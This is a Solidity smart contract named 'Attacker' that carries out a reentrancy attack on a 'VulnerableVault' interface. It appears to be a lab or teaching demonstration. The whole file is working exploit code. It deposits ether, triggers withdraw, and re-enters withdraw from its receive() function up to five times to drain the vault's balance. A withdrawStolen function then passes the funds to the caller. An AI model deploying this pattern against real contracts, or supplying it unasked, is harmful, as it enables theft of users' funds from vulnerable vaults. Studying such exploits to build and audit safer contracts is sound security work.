// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title Attacker
 * @dev Contract that exploits reentrancy vulnerability in VulnerableVault
 */
contract Attacker {
    IVulnerableVault public vault;
    uint256 public attackCount;
    uint256 public maxAttacks = 5; // Limit reentrancy depth

    event AttackStarted(uint256 initialBalance);
    event ReentrancyExecuted(uint256 count);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address _vaultAddress) {
        vault = IVulnerableVault(_vaultAddress);
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.value > 0, "Need ether to attack");

        emit AttackStarted(msg.value);

        // Deposit to the vault
        vault.deposit{value: msg.value}();

        // Start the reentrancy attack
        attackCount = 0;
        vault.withdraw();

        emit AttackCompleted(address(this).balance);
    }

    // Fallback function - called when receiving ether
    receive() external payable {
        attackCount++;
        emit ReentrancyExecuted(attackCount);

        // Continue reentrancy attack if conditions are met
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    // Withdraw stolen funds
    function withdrawStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
